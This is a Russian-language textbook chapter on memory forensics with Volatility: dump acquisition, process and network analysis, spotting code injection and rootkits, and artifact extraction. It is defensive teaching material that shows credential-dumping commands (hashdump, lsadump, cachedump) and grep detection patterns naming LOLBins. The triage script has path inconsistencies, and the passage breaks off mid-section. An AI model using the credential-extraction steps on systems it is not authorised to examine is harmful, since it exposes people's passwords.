# Глава 10.4: Форензика: Volatility и анализ памяти

## Введение

Форензика оперативной памяти (memory forensics) — это раздел цифровой криминалистики, изучающий содержимое оперативной памяти компьютера для обнаружения следов вредоносной активности, восстановления артефактов и понимания действий злоумышленника. В отличие от дискового анализа, анализ памяти позволяет обнаружить:

- **Процессы в памяти**, не имеющие соответствующих файлов на диске (fileless malware)
- **Сетевые соединения** на момент создания дампа
- **Расшифрованные данные**: ключи шифрования, пароли, токены аутентификации
- **Внедрённый код** (code injection) в легитимные процессы
- **Руткиты**, скрывающие своё присутствие от ОС

```
┌─────────────────────────────────────────────────────────────┐
│              MEMORY FORENSICS WORKFLOW                       │
│                                                              │
│  Инцидент ──► Создание дампа ──► Первичный анализ           │
│                    │                     │                   │
│              (WinPMem,           (imageinfo,                 │
│               LiME,              pslist,                     │
│               DumpIt)            pstree)                     │
│                                          │                   │
│                             Глубокий анализ                  │
│                                          │                   │
│                    ┌─────────────────────┤                   │
│                    │                     │                   │
│               malfind            netscan/netstat             │
│               dlllist            cmdline                     │
│               handles            filescan                    │
│                    │                     │                   │
│                    └──────► ОТЧЁТ ◄──────┘                   │
└─────────────────────────────────────────────────────────────┘
```

> **Важно:** При работе с дампами памяти всегда создавайте криминалистически верифицированную копию (с хэш-суммой SHA256) до начала анализа. Оригинальный дамп не должен изменяться в процессе работы.

---

## 10.4.1 Основные концепции форензики памяти

### Структура памяти Windows

```
Виртуальное адресное пространство процесса Windows (x64):
┌─────────────────────────────┐  0xFFFFFFFFFFFFFFFF
│   Kernel Space (ядро ОС)    │
├─────────────────────────────┤  0xFFFF800000000000
│   (пустое пространство)     │
├─────────────────────────────┤  0x00007FFFFFFFFFFF
│   User Space (приложения)   │
│   ┌─────────────────────┐   │
│   │ Stack               │   │
│   ├─────────────────────┤   │
│   │ Heap                │   │
│   ├─────────────────────┤   │
│   │ DLL mappings        │   │
│   ├─────────────────────┤   │
│   │ Executable (.exe)   │   │
│   └─────────────────────┘   │
└─────────────────────────────┘  0x0000000000000000
```

### Ключевые структуры данных ядра Windows

```
EPROCESS (Kernel Executive Process Block)
├── UniqueProcessId (PID)
├── InheritedFromUniqueProcessId (PPID)
├── ImageFileName (имя процесса, до 15 символов)
├── ActiveProcessLinks (двусвязный список всех процессов)
├── Peb → Process Environment Block
│   ├── Ldr → PEB_LDR_DATA (список загруженных модулей)
│   ├── ProcessParameters → RTL_USER_PROCESS_PARAMETERS
│   │   ├── CommandLine
│   │   ├── ImagePathName
│   │   └── CurrentDirectory
│   └── ProcessHeap
├── VadRoot → Virtual Address Descriptor tree
├── ObjectTable → Handle Table
└── Token → ETOKEN (привилегии и SID)
```

### Типы дампов памяти

| Тип дампа | Содержимое | Размер | Использование |
|-----------|------------|--------|---------------|
| Full memory dump | Вся RAM | = RAM | Полный анализ |
| Kernel memory dump | Только ядро | ~30% RAM | Анализ ядра |
| Minidump | Стек потока | Несколько МБ | Краш-анализ |
| Hibernation file (hiberfil.sys) | Вся RAM | = RAM | Анализ без выключения |
| Virtual machine snapshot | Вся RAM VM | = vRAM | Forensic-friendly |
| VMware .vmem | Вся RAM VM | = vRAM | Автоматически создаётся |

---

## 10.4.2 Создание дампов памяти

### Windows: инструменты создания дампа

```powershell
# WinPMem (рекомендуется для forensics)
# Скачать: https://github.com/Velocidex/WinPmem
winpmem_mini_x64_rc2.exe -o memory.raw

# DumpIt (простой в использовании)
DumpIt.exe /OUTPUT memory.raw /QUIET

# Через встроенный диспетчер задач (только для процессов):
# Task Manager → процесс → Create dump file

# Через WinDbg (для анализа на той же машине):
.dump /f /ma C:\dumps\memory.dmp

# NotMyFault (Sysinternals):
NotMyFault.exe /crash

# Hibernate-файл как дамп памяти (без доп. инструментов):
# Принудительная гибернация:
powercfg /h on
shutdown /h
# Файл C:\hiberfil.sys будет содержать дамп памяти

# Конвертация hiberfil.sys в raw (через Volatility):
# vol.py -f hiberfil.sys imagecopy -O memory.raw
```

### Linux: создание дампа

```bash
# LiME (Linux Memory Extractor) — через kernel module
# Установка:
git clone https://github.com/504ensicsLabs/LiME.git
cd LiME/src
make

# Загрузка модуля и создание дампа:
sudo insmod lime-$(uname -r).ko "path=/tmp/memory.lime format=lime"

# Через /dev/mem (ограничено, не всегда доступно):
sudo dd if=/dev/mem of=/tmp/memory.raw bs=1M

# Через /proc/kcore:
sudo dd if=/proc/kcore of=/tmp/memory.raw bs=1M

# Получение дампа удалённо через сеть:
sudo insmod lime.ko "path=tcp:4444 format=lime"
# На принимающей стороне:
nc target_ip 4444 > memory.lime
```

### VMware и другие гипервизоры

```bash
# VMware: дамп создаётся автоматически при снэпшоте
# Файлы: <vm_name>.vmem, <vm_name>.vmss

# VirtualBox: остановить VM, создать snapshot
VBoxManage snapshot "VM_Name" take "forensic_snapshot"

# Hyper-V: CheckPoint через PowerShell
Checkpoint-VM -Name "VM_Name" -SnapshotName "forensic_snapshot"

# KVM/QEMU: через virsh
virsh dump --domain domain_name --file /tmp/memory.dump --format raw
```

### Верификация целостности дампа

```bash
# Создание хэш-суммы сразу после захвата
sha256sum memory.raw > memory.raw.sha256
md5sum memory.raw > memory.raw.md5

# Верификация перед анализом
sha256sum -c memory.raw.sha256

# Документирование метаданных
echo "Дата создания: $(date)" >> evidence.log
echo "SHA256: $(sha256sum memory.raw)" >> evidence.log
echo "Размер: $(du -sh memory.raw)" >> evidence.log
echo "Оператор: $(whoami)" >> evidence.log
echo "Машина: $(hostname)" >> evidence.log
```

---

## 10.4.3 Volatility: установка и настройка

### Установка Volatility 3 (рекомендуется)

```bash
# Клонирование репозитория
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3

# Установка зависимостей
pip3 install -r requirements.txt

# Установка дополнительных зависимостей для полной функциональности
pip3 install yara-python
pip3 install capstone
pip3 install pefile
pip3 install pycryptodome

# Проверка установки
python3 vol.py -h

# Или установка как пакета
pip3 install volatility3

# Путь к символам (для корректного анализа Windows)
# Volatility 3 автоматически скачивает символы Microsoft
# Можно указать директорию для кэша:
export VOLATILITY_SYMBOL_CACHE=/opt/volatility3/symbols/
```

### Установка Volatility 2 (для старых систем)

```bash
# Python 2.7 требуется для Volatility 2
pip2 install volatility

# Или из исходников
git clone https://github.com/volatilityfoundation/volatility.git
cd volatility
python2 setup.py install

# Установка зависимостей
pip2 install distorm3 pycryptodome yara-python

# Скачивание Symbol Tables для Volatility 2
# https://github.com/volatilityfoundation/volatility/wiki/Symbol-Tables
```

### Базовый синтаксис

```bash
# Volatility 3 (новый синтаксис)
python3 vol.py -f memory.raw [плагин]

# Например:
python3 vol.py -f memory.raw windows.info
python3 vol.py -f memory.raw windows.pslist
python3 vol.py -f memory.raw windows.pstree

# Volatility 2 (старый синтаксис)
python2 vol.py -f memory.raw --profile=Win10x64_19041 [плагин]

# Определение профиля в Volatility 2
python2 vol.py -f memory.raw imageinfo

# Вывод в CSV (Vol 3)
python3 vol.py -f memory.raw windows.pslist > pslist_output.txt

# Вывод с прогресс-баром
python3 vol.py -f memory.raw -p /tmp/progress windows.pslist
```

---

## 10.4.4 Ключевые плагины Volatility

### imageinfo / windows.info: идентификация образа

```bash
# Volatility 3
python3 vol.py -f memory.raw windows.info

# Вывод:
# Variable                                  Value
# Kernel Base                               0xf80002a54000
# DTB                                       0x1ab000
# Symbols                                   file:///opt/vol3/symbols/...
# Is64Bit                                   True
# IsPAE                                     False
# layer_name                                0 WindowsIntel32e
# memory_layer                              1 FileLayer
# KdVersionBlock                            0xf80002c57398
# Major/Minor                               15.7601
# MachineType                               34404
# KeNumberProcessors                        2
# SystemTime                                2024-01-15 10:23:45
# NtSystemRoot                              C:\Windows
# NtProductType                             NtProductWinNt
# NtMajorVersion                            6
# NtMinorVersion                            1

# Volatility 2
python2 vol.py -f memory.raw imageinfo
```

### pslist: список процессов

```bash
# Volatility 3
python3 vol.py -f memory.raw windows.pslist

# Вывод:
# PID    PPID   ImageFileName    Offset(V)           Threads Handles SessionId Wow64  CreateTime                 ExitTime
# 4      0      System           0x8a4f3c90          80      535     -         False  2024-01-15 09:00:00.000000 N/A
# 304    4      smss.exe         0x8a5f1080          2       29      -         False  2024-01-15 09:00:01.000000 N/A
# 416    308    csrss.exe        0x8a6b3380          10      365     0         False  2024-01-15 09:00:02.000000 N/A
# 468    460    winlogon.exe     0x8a6b9380          3       109     1         False  2024-01-15 09:00:03.000000 N/A
# 528    416    services.exe     0x8a6d5380          11      237     0         False  2024-01-15 09:00:03.000000 N/A
# ...
# 2840   1456   cmd.exe          0x8f3a2480          1       20      1         False  2024-01-15 10:20:15.000000 N/A
# 3912   2840   malware.exe      0x8f4b1380          3       45      1         False  2024-01-15 10:21:33.000000 N/A

# Volatility 2
python2 vol.py -f memory.raw --profile=Win7SP1x64 pslist
```

### pstree: дерево процессов

```bash
# Volatility 3
python3 vol.py -f memory.raw windows.pstree

# Вывод (дерево):
# PID    PPID   ImageFileName      Offset(V)           Threads Handles 32Bit CreateTime
# 4      0      System             0x8a4f3c90          80      535     False 2024-01-15 09:00:00
# * 304  4      smss.exe           0x8a5f1080          2       29      False 2024-01-15 09:00:01
# ** 416 304    csrss.exe          0x8a6b3380          10      365     False 2024-01-15 09:00:02
# ** 460 304    wininit.exe        0x8a6b5380          3       76      False 2024-01-15 09:00:02
# *** 528 460   services.exe       0x8a6d5380          11      237     False 2024-01-15 09:00:03
# **** 664 528  svchost.exe        0x8a7f3380          12      395     False 2024-01-15 09:00:04
# *** 536 460   lsass.exe          0x8a6e1380          7       567     False 2024-01-15 09:00:03
# 1456   1344   explorer.exe       0x8e1a3380          35      892     False 2024-01-15 09:01:15
# * 2840 1456   cmd.exe            0x8f3a2480          1       20      False 2024-01-15 10:20:15
# ** 3912 2840  malware.exe        0x8f4b1380          3       45      False 2024-01-15 10:21:33

# Аномалия: malware.exe порождён из cmd.exe, запущенного из explorer.exe
# Это может указывать на ручной запуск вредоносной программы

# Volatility 2
python2 vol.py -f memory.raw --profile=Win7SP1x64 pstree
```

### psscan: поиск процессов через сканирование памяти

```bash
# psscan ищет структуры EPROCESS через сканирование (обходит DKOM-сокрытие)
python3 vol.py -f memory.raw windows.psscan

# Сравнение pslist и psscan для выявления скрытых процессов:
python3 vol.py -f memory.raw windows.pslist > pslist.txt
python3 vol.py -f memory.raw windows.psscan > psscan.txt

# Разница: процессы в psscan, но не в pslist = скрытые (DKOM rootkit)
python3 - << 'EOF'
import re

def extract_pids(filename):
    pids = set()
    with open(filename) as f:
        for line in f:
            match = re.match(r'^\s*(\d+)\s+', line)
            if match and int(match.group(1)) > 0:
                pids.add(int(match.group(1)))
    return pids

pslist_pids = extract_pids('pslist.txt')
psscan_pids = extract_pids('psscan.txt')

hidden = psscan_pids - pslist_pids
print(f"Скрытые процессы (есть в psscan, нет в pslist): {hidden}")
EOF
```

### netscan: сетевые соединения

```bash
# Volatility 3
python3 vol.py -f memory.raw windows.netscan

# Вывод:
# Offset     Proto   LocalAddr        LocalPort  ForeignAddr       ForeignPort State       PID  Owner
# 0x1a3f2000 TCPv4   192.168.1.100    49821      10.0.0.1          443         ESTABLISHED 3912 malware.exe
# 0x1a4c1000 TCPv4   0.0.0.0          80         0.0.0.0           0           LISTEN      4    System
# 0x1a5d3000 UDPv4   0.0.0.0          5355       *                 *                       664  svchost.exe
# 0x1b2f1000 TCPv4   192.168.1.100    49822      185.220.101.1     8080        ESTABLISHED 3912 malware.exe

# Фильтрация ESTABLISHED соединений на нестандартных портах:
python3 vol.py -f memory.raw windows.netscan | grep -E "ESTABLISHED" | grep -v ":443|:80|:53"

# Volatility 2 (отдельные плагины для разных версий ОС):
python2 vol.py -f memory.raw --profile=Win7SP1x64 netscan    # Win7+
python2 vol.py -f memory.raw --profile=WinXPSP3x86 connections  # WinXP
python2 vol.py -f memory.raw --profile=WinXPSP3x86 connscan     # WinXP
```

### malfind: поиск инжектированного кода

```bash
# malfind ищет регионы памяти с признаками инъекции:
# - RWX (Read-Write-Execute) разрешения
# - Нет соответствующего файла на диске
# - Содержат PE-заголовок (MZ)

python3 vol.py -f memory.raw windows.malfind

# Вывод:
# PID    Process        Start VPN        End VPN          Tag   Protection  CommitCharge  PrivateMemory  File output
# 3912   malware.exe    0x1f0000         0x1f3000         VadS  PAGE_EXECUTE_READWRITE  4   1          Disabled
# 3912   malware.exe    0x2a0000         0x2b2000         VadS  PAGE_EXECUTE_READWRITE  18  1          Disabled
# Hexdump:
# 4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00   MZ..............
# b8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00   ........@.......
# (MZ заголовок = PE-файл, внедрённый в память)

# Сохранение всех подозрительных регионов для анализа:
python3 vol.py -f memory.raw windows.malfind --dump --dump-dir /tmp/malfind_output/

# Анализ извлечённых файлов:
ls /tmp/malfind_output/
# pid.3912.vad.0x1f0000-0x1f3000.dmp
# pid.3912.vad.0x2a0000-0x2b2000.dmp

# Проверка через YARA:
yara /path/to/rules.yar /tmp/malfind_output/

# Проверка хэша через VirusTotal (если есть API):
for file in /tmp/malfind_output/*.dmp; do
    hash=$(sha256sum "$file" | cut -d' ' -f1)
    echo "File: $file, SHA256: $hash"
    # curl "https://www.virustotal.com/api/v3/files/$hash" -H "x-apikey: $VT_API_KEY"
done
```

### dlllist: список загруженных DLL

```bash
# Вывод DLL для всех процессов
python3 vol.py -f memory.raw windows.dlllist

# DLL конкретного процесса
python3 vol.py -f memory.raw windows.dlllist --pid 3912

# Вывод:
# PID    Process       Base               Size    Name                  Path
# 3912   malware.exe   0x00007ff7a0000000 0x1e000 malware.exe           C:\Users\user\AppData\Local\Temp\malware.exe
# 3912   malware.exe   0x00007ffd98100000 0x1c000 ntdll.dll             C:\Windows\SYSTEM32\ntdll.dll
# 3912   malware.exe   0x00007ffd96e00000 0x91000 KERNEL32.DLL          C:\Windows\System32\KERNEL32.DLL
# 3912   malware.exe   0x00007ffd96c80000 0x2d000 CRYPTBASE.dll         C:\Windows\SYSTEM32\CRYPTBASE.dll
# 3912   malware.exe   0x0000000070010000 0x85000 unknown               (нет пути — подозрительно!)

# Поиск DLL без пути на диске (reflective injection):
python3 vol.py -f memory.raw windows.dlllist | awk '{if ($5 == "" && $4 != "N/A") print $0}'

# Volatility 2
python2 vol.py -f memory.raw --profile=Win7SP1x64 dlllist -p 3912
```

### cmdline: аргументы командной строки

```bash
# Командные строки всех процессов
python3 vol.py -f memory.raw windows.cmdline

# Вывод:
# PID    Process       Args
# 416    csrss.exe     %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=...
# 528    services.exe  C:\Windows\system32\services.exe
# 2840   cmd.exe       "C:\Windows\system32\cmd.exe"
# 3912   malware.exe   C:\Users\user\AppData\Local\Temp\malware.exe -server 10.0.0.1 -port 4444 -sleep 60

# Обнаружение подозрительных аргументов
python3 vol.py -f memory.raw windows.cmdline | grep -iE \
    "powershell|cmd|wscript|cscript|mshta|regsvr32|rundll32|schtasks|at\.exe" | \
    grep -iE "http|ftp|base64|enc|bypass|hidden|temp|appdata"

# Volatility 2
python2 vol.py -f memory.raw --profile=Win7SP1x64 cmdline
```

### handles: дескрипторы объектов

```bash
# Дескрипторы конкретного процесса
python3 vol.py -f memory.raw windows.handles --pid 3912

# Фильтрация по типу (File, Registry, Process, Thread, Event, Mutant)
python3 vol.py -f memory.raw windows.handles --pid 3912 | grep "File"

# Вывод:
# PID    Process       Offset             HandleValue Type    GrantedAccess Name
# 3912   malware.exe   0x8a1b2380         0x4          File    0x120089       \Device\HarddiskVolume2\Windows\System32\
# 3912   malware.exe   0x9c2f1840         0x8          File    0x120089       \Device\HarddiskVolume2\Users\user\AppData\Roaming\
# 3912   malware.exe   0x8b3c4180         0x18         Mutant  0x1f0001       Global\{MUTEX_NAME_C2}

# Мьютексы часто используются вредоносным ПО для предотвращения повторного запуска:
python3 vol.py -f memory.raw windows.handles | grep -i "Mutant"

# Volatility 2
python2 vol.py -f memory.raw --profile=Win7SP1x64 handles -p 3912 -t Mutant
```

---

## 10.4.5 Обнаружение техник инъекции кода

### Process Hollowing (RunPE)

```bash
# Признаки Process Hollowing:
# 1. Процесс запущен как легитимный (svchost.exe, explorer.exe)
# 2. VAD-запись показывает другой путь, чем в PEB
# 3. Базовый адрес в PEB не совпадает с VAD

# Проверка через vadinfo
python3 vol.py -f memory.raw windows.vadinfo --pid 664

# Сравнение exe в PEB и в VAD:
python3 vol.py -f memory.raw windows.dlllist --pid 664 | head -5
# Если путь к .exe подозрительный или отличается от ожидаемого — Process Hollowing

# Volatility 2: malfind для обнаружения
python2 vol.py -f memory.raw --profile=Win7SP1x64 malfind -p 664
```

### DLL Injection

```bash
# Классическая DLL Injection: вредоносная DLL загружается в легитимный процесс

# 1. Найдём все DLL в процессе explorer.exe:
python3 vol.py -f memory.raw windows.dlllist --pid 1456 > explorer_dlls.txt

# 2. Проверим DLL без описания или с подозрительным путём:
grep -v "C:\\Windows\\System32\|C:\\Windows\\SysWOW64\|C:\\Program Files" explorer_dlls.txt

# 3. Проверим DLL через ldrmodules (VAD vs PEB LDR):
python2 vol.py -f memory.raw --profile=Win7SP1x64 ldrmodules -p 1456

# Вывод ldrmodules:
# Pid      Process              Base          InLoad InInit InMem MappedPath
# 1456     explorer.exe   0x76d50000    True   True   True   C:\Windows\System32\kernel32.dll
# 1456     explorer.exe   0x01000000    True   False  True   (пусто — reflective DLL!)
# InLoad=True, InInit=False, InMem=True → подозрительно!
```

### Reflective DLL Injection

```bash
# Reflective DLL загружает себя без использования LoadLibrary
# Признаки:
# - DLL видна в VAD, но не в PEB LDR
# - Нет пути на диске
# - Регион памяти содержит PE-заголовок

# Поиск через malfind с дампом:
python3 vol.py -f memory.raw windows.malfind --dump --dump-dir /tmp/reflective/

# Анализ PE-файлов в извлечённых регионах:
python3 << 'EOF'
import os
import struct

def check_pe_header(filepath):
    """Проверка наличия PE-заголовка"""
    with open(filepath, 'rb') as f:
        header = f.read(2)
    return header == b'MZ'

dump_dir = '/tmp/reflective/'
for filename in os.listdir(dump_dir):
    filepath = os.path.join(dump_dir, filename)
    if check_pe_header(filepath):
        size = os.path.getsize(filepath)
        print(f"PE файл: {filename} ({size} bytes)")
EOF
```

### Process Injection via CreateRemoteThread

```bash
# Поиск следов CreateRemoteThread:
# 1. Проверяем потоки процесса:
python3 vol.py -f memory.raw windows.threads --pid 1456

# 2. Ищем потоки с начальным адресом вне нормальных модулей:
python3 vol.py -f memory.raw windows.thrdscan | \
    grep -v "C:\\Windows\\System32" | \
    awk '{print $1, $2, $3, $4, $5}'

# Volatility 2:
python2 vol.py -f memory.raw --profile=Win7SP1x64 threads -p 1456
```

---

## 10.4.6 Практический анализ: полный workflow

### Шаг 1: Первичная разведка

```bash
#!/bin/bash
# memory_initial_triage.sh - Первичный анализ дампа памяти

MEMORY_FILE="$1"
OUTPUT_DIR="${2:-/tmp/vol_output_$(date +%Y%m%d_%H%M%S)}"

if [ -z "$MEMORY_FILE" ]; then
    echo "Использование: $0 <memory_dump> [output_dir]"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo "[*] Начало анализа: $MEMORY_FILE"
echo "[*] Вывод в: $OUTPUT_DIR"
echo "[*] Время: $(date)"

VOL="python3 /opt/volatility3/vol.py"

# Информация о системе
echo "[*] Получение информации о системе..."
$VOL -f "$MEMORY_FILE" windows.info > "$OUTPUT_DIR/01_windows_info.txt" 2>&1

# Список процессов
echo "[*] Получение списка процессов..."
$VOL -f "$MEMORY_FILE" windows.pslist > "$OUTPUT_DIR/02_pslist.txt" 2>&1
$VOL -f "$MEMORY_FILE" windows.pstree > "$OUTPUT_DIR/03_pstree.txt" 2>&1
$VOL -f "$MEMORY_FILE" windows.psscan > "$OUTPUT_DIR/04_psscan.txt" 2>&1

# Сравнение pslist и psscan (поиск скрытых процессов)
echo "[*] Поиск скрытых процессов..."
python3 << 'PYEOF'
import re

def get_pids(filename):
    pids = {}
    with open(filename) as f:
        for line in f:
            m = re.match(r'\s*(\d+)\s+\d+\s+(\S+)', line)
            if m:
                pids[int(m.group(1))] = m.group(2)
    return pids

pslist = get_pids('/tmp/vol_output/02_pslist.txt')
psscan = get_pids('/tmp/vol_output/04_psscan.txt')

hidden = set(psscan.keys()) - set(pslist.keys())
if hidden:
    print(f"\n[!] ОБНАРУЖЕНЫ СКРЫТЫЕ ПРОЦЕССЫ: {hidden}")
    for pid in hidden:
        print(f"    PID: {pid}, Name: {psscan.get(pid, 'unknown')}")
else:
    print("\n[+] Скрытых процессов не обнаружено")
PYEOF

# Сетевые соединения
echo "[*] Получение сетевых соединений..."
$VOL -f "$MEMORY_FILE" windows.netscan > "$OUTPUT_DIR/05_netscan.txt" 2>&1

# Командные строки
echo "[*] Получение командных строк..."
$VOL -f "$MEMORY_FILE" windows.cmdline > "$OUTPUT_DIR/06_cmdline.txt" 2>&1

# Поиск инъекций
echo "[*] Поиск инъекций кода..."
mkdir -p "$OUTPUT_DIR/malfind/"
$VOL -f "$MEMORY_FILE" windows.malfind --dump --dump-dir "$OUTPUT_DIR/malfind/" > "$OUTPUT_DIR/07_malfind.txt" 2>&1

echo "[+] Первичный анализ завершён. Результаты в: $OUTPUT_DIR"
echo "[*] Рекомендуется проверить:"
echo "    1. Скрытые процессы"
echo "    2. ESTABLISHED соединения в 07_netscan.txt"
echo "    3. Подозрительные командные строки в 06_cmdline.txt"
echo "    4. Файлы в $OUTPUT_DIR/malfind/ через VirusTotal/YARA"
```

### Шаг 2: Глубокий анализ подозрительного процесса

```bash
#!/usr/bin/env python3
"""
Глубокий анализ подозрительного процесса в дампе памяти
"""

import subprocess
import json
import os
import hashlib
from pathlib import Path


VOLATILITY = "python3 /opt/volatility3/vol.py"
MEMORY_FILE = "/evidence/memory.raw"
SUSPECT_PID = 3912
OUTPUT_DIR = Path(f"/analysis/pid_{SUSPECT_PID}")

OUTPUT_DIR.mkdir(parents=True, exist_ok=True)


def run_vol(plugin: str, extra_args: str = "") -> str:
    """Запуск плагина Volatility и возврат вывода"""
    cmd = f"{VOLATILITY} -f {MEMORY_FILE} {plugin} {extra_args}"
    result = subprocess.run(
        cmd, shell=True, capture_output=True, text=True
    )
    return result.stdout


def analyze_process(pid: int):
    """Полный анализ процесса"""
    print(f"[*] Анализ PID: {pid}")
    
    # 1. Базовая информация о процессе
    print("[*] 1. Базовая информация...")
    pslist = run_vol("windows.pslist", f"--pid {pid}")
    (OUTPUT_DIR / "01_pslist.txt").write_text(pslist)
    print(pslist)
    
    # 2. DLL-список
    print("[*] 2. Загруженные DLL...")
    dlllist = run_vol("windows.dlllist", f"--pid {pid}")
    (OUTPUT_DIR / "02_dlllist.txt").write_text(dlllist)
    
    # Поиск подозрительных DLL
    suspicious_dlls = []
    for line in dlllist.split('\n'):
        if 'Temp' in line or 'AppData' in line or 'Downloads' in line:
            suspicious_dlls.append(line)
    
    if suspicious_dlls:
        print(f"[!] Подозрительные DLL из Temp/AppData:")
        for dll in suspicious_dlls:
            print(f"    {dll}")
    
    # 3. Командная строка
    print("[*] 3. Командная строка...")
    cmdline = run_vol("windows.cmdline", f"--pid {pid}")
    (OUTPUT_DIR / "03_cmdline.txt").write_text(cmdline)
    print(cmdline)
    
    # 4. Дескрипторы
    print("[*] 4. Открытые дескрипторы...")
    handles = run_vol("windows.handles", f"--pid {pid}")
    (OUTPUT_DIR / "04_handles.txt").write_text(handles)
    
    # Поиск мьютексов (артефакт малвари)
    mutants = [l for l in handles.split('\n') if 'Mutant' in l or 'Mutex' in l]
    if mutants:
        print(f"[!] Мьютексы процесса:")
        for m in mutants:
            print(f"    {m}")
    
    # 5. Поиск инъекций
    print("[*] 5. Анализ инъекций кода...")
    malfind_dir = OUTPUT_DIR / "malfind"
    malfind_dir.mkdir(exist_ok=True)
    
    malfind = run_vol(
        "windows.malfind", 
        f"--pid {pid} --dump --dump-dir {malfind_dir}"
    )
    (OUTPUT_DIR / "05_malfind.txt").write_text(malfind)
    
    # Хэш извлечённых файлов
    dumped_files = list(malfind_dir.glob("*.dmp"))
    if dumped_files:
        print(f"[!] Обнаружены инъекции, извлечено файлов: {len(dumped_files)}")
        for dmp in dumped_files:
            with open(dmp, 'rb') as f:
                data = f.read()
            sha256 = hashlib.sha256(data).hexdigest()
            print(f"    {dmp.name}: SHA256={sha256}")
    
    # 6. VAD (Virtual Address Descriptor)
    print("[*] 6. Анализ VAD...")
    vadinfo = run_vol("windows.vadinfo", f"--pid {pid}")
    (OUTPUT_DIR / "06_vadinfo.txt").write_text(vadinfo)
    
    # Поиск RWX регионов
    rwx_regions = [l for l in vadinfo.split('\n') 
                   if 'EXECUTE_READWRITE' in l or 'EXECUTE_READ_WRITE' in l]
    if rwx_regions:
        print(f"[!] RWX регионы памяти (подозрительно):")
        for r in rwx_regions:
            print(f"    {r}")
    
    print(f"\n[+] Анализ PID {pid} завершён. Артефакты в: {OUTPUT_DIR}")


if __name__ == '__main__':
    analyze_process(SUSPECT_PID)
```

---

## 10.4.7 Обнаружение руткитов

### DKOM (Direct Kernel Object Manipulation)

```bash
# DKOM-руткиты модифицируют EPROCESS.ActiveProcessLinks
# для скрытия процессов от API

# Обнаружение через сравнение списков:
python3 vol.py -f memory.raw windows.pslist > pslist.txt   # Ходит по ActiveProcessLinks
python3 vol.py -f memory.raw windows.psscan > psscan.txt   # Сканирует физическую память

# Процессы в psscan, отсутствующие в pslist = DKOM-скрытые

# Проверка SSDT (System Service Descriptor Table) hooks:
python2 vol.py -f memory.raw --profile=Win7SP1x64 ssdt

# Вывод:
# [x86] Gathering all referenced SSDTs from KTHREADs...
# Finding appropriate address space for tables...
# SSDT[0] at 82479b00 with 401 entries
# Entry 0x0000: 0x828e7bc8 (NtAcceptConnectPort) owned by ntoskrnl.exe
# Entry 0x0001: 0x828e4c18 (NtAccessCheck) owned by ntoskrnl.exe
# ...
# Entry 0x0029: 0xf84a1234 (NtCreateFile) owned by malicious_rootkit.sys  ← HOOK!

# Проверка целостности IDT (Interrupt Descriptor Table):
python2 vol.py -f memory.raw --profile=Win7SP1x64 idt
```

### Анализ драйверов

```bash
# Список загруженных драйверов:
python3 vol.py -f memory.raw windows.driverscan

# Подозрительные драйверы (без подписи, из Temp):
python3 vol.py -f memory.raw windows.driverscan | grep -iE "temp|appdata|users"

# Список модулей ядра:
python3 vol.py -f memory.raw windows.modules

# Volatility 2: более детальный анализ
python2 vol.py -f memory.raw --profile=Win7SP1x64 modules
python2 vol.py -f memory.raw --profile=Win7SP1x64 modscan    # Сканирование (bypass DKOM)

# Сравнение modules и modscan:
python2 vol.py -f memory.raw --profile=Win7SP1x64 modules > modules.txt
python2 vol.py -f memory.raw --profile=Win7SP1x64 modscan > modscan.txt
# Разница = скрытые драйверы руткита
```

---

## 10.4.8 Извлечение артефактов

### Дамп процесса на диск

```bash
# Извлечение исполняемого файла процесса:
python3 vol.py -f memory.raw windows.dumpfiles --pid 3912 --dump-dir /tmp/dumps/

# Или конкретного файла по виртуальному адресу:
python3 vol.py -f memory.raw windows.dumpfiles --virtaddr 0x8f4b1380 --dump-dir /tmp/dumps/

# Volatility 2:
python2 vol.py -f memory.raw --profile=Win7SP1x64 procdump -p 3912 --dump-dir /tmp/dumps/
python2 vol.py -f memory.raw --profile=Win7SP1x64 memdump -p 3912 --dump-dir /tmp/dumps/
```

### Извлечение реестра из памяти

```bash
# Список ульев реестра:
python3 vol.py -f memory.raw windows.registry.hivelist

# Вывод:
# Offset     FileFullPath
# 0xa3421000 \REGISTRY\MACHINE\SYSTEM
# 0xa4521000 \REGISTRY\MACHINE\SOFTWARE
# 0xa5621000 \REGISTRY\MACHINE\SECURITY
# 0xa6721000 \REGISTRY\USER\S-1-5-21-...

# Чтение конкретного ключа:
python3 vol.py -f memory.raw windows.registry.printkey \
    --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Проверка ключей автозапуска:
python3 vol.py -f memory.raw windows.registry.printkey \
    --key "SYSTEM\CurrentControlSet\Services"

# Дамп всего куста:
python2 vol.py -f memory.raw --profile=Win7SP1x64 \
    hivescan 
python2 vol.py -f memory.raw --profile=Win7SP1x64 \
    dumpregistry --dump-dir /tmp/registry/
```

### Извлечение паролей и хэшей

```bash
# Дамп хэшей NTLM из SAM/SYSTEM:
python3 vol.py -f memory.raw windows.hashdump

# Вывод:
# User      rid  lmhash                           nthash
# Administrator 500  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
# Guest         501  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
# john          1001 aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889

# LSA Secrets (кэшированные домен-пароли):
python2 vol.py -f memory.raw --profile=Win7SP1x64 lsadump

# Cachedump (кэшированные AD credentials):
python2 vol.py -f memory.raw --profile=Win7SP1x64 cachedump
```

### Поиск строк и артефактов

```bash
# Извлечение строк из всей памяти:
strings memory.raw | grep -iE "(http|ftp|ssh|password|passwd|token)" > strings_output.txt

# Поиск URL в памяти:
strings memory.raw | grep -oE "https?://[^[:space:]]{10,}" | sort -u

# Поиск IP-адресов:
strings memory.raw | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort -u | \
    grep -v "^(10\.|192\.168\.|172\.16\.|127\.)" # Исключаем внутренние

# Поиск Base64:
strings memory.raw | grep -oE "[A-Za-z0-9+/]{40,}={0,2}" | \
    while read b64; do
        decoded=$(echo "$b64" | base64 -d 2>/dev/null | strings)
        [ -n "$decoded" ] && echo "Base64: $b64 → $decoded"
    done

# Volatility: filescan для поиска файлов:
python3 vol.py -f memory.raw windows.filescan | grep -iE "\.exe|\.dll|\.ps1|\.bat"

# Извлечение конкретного файла:
